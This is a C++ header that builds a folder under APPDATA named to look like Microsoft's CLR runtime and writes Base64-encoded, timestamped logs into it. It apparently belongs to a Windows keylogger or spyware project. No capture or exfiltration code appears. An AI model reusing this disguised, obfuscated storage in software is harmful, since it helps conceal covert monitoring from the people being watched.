#ifndef _MY_IO
#define _MY_IO

#include<string>
#include<fstream>
#include<cstdlib>
#include<Windows.h>
#include"Base64.h"
#include"Helper.h"

namespace IO
{
	std::string get_our_path(const bool append_seperator = false)
	{
		std::string dir{ getenv("APPDATA") };
		std::string full{ dir + "\\Microsoft\\CLR" };
		return full + (append_seperator ? "\\" : "");
	}

	//一次創建一個檔案
	bool make_one_dir(const std::string &path)
	{
		return static_cast<bool>(CreateDirectory(path.c_str(), NULL)) || ( GetLastError() == ERROR_ALREADY_EXISTS );
	}

	//創建該路徑的所有檔案
	bool make_dir(std::string path)
	{
		for (auto &ch : path)
		{
			if (ch == '\\')
			{
				ch = '\0';
				if (!make_one_dir(path))
				{
					ch = '\\';
					return false;
				}
				ch = '\\';
			}
		}

		return true;
	}

	//寫入 log ( 寫入時間與傳入的東西 )   並回傳 log 名稱  (以時間命名)
	template<typename T>
	std::string write_log(const T &input)
	{
		std::string path{ get_our_path(true) };
		Helper::DateTime dt;
		std::string name{ dt.get_date_time_string() + ".log" };

		try
		{
			std::ofstream fout{ path + name };

			if (!fout)
				return "";

			std::ostringstream ostr;

			ostr << "[" << dt.get_date_time_string() << "]" << std::endl;
			ostr << input << std::endl;

			fout << Base64::Encryption{}.encode(ostr.str());

			if (!fout)
				return "";

			return name;
		}
		catch (...)
		{
			return "";
		}
	}
}

#endif // !_IO
